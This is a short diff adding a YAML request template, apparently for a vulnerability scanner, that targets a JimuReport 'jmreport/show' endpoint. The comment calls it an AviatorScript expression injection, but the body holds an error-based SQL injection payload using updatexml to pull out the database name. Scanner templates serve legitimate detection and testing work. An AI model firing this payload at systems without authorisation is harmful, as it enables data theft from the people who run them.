@@ -1,0 +1,8 @@
+requests:
+  # AviatorScript表达式注入漏洞
+  show:
+    URL: "jmreport/show"
+    Method: "POST"
+    Content-Type: "application/json"
+    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0"
+    Body: "{\"id\":\"961455b47c0b86dc961e90b5893bff05\",\"apiUrl\":\"\",\"params\":\"{\\\"id\\\":\\\"1' or '%1%' like (updatexml(0x3a,concat(1,(select database())),1)) or '%%' like '\\\"}\"}"
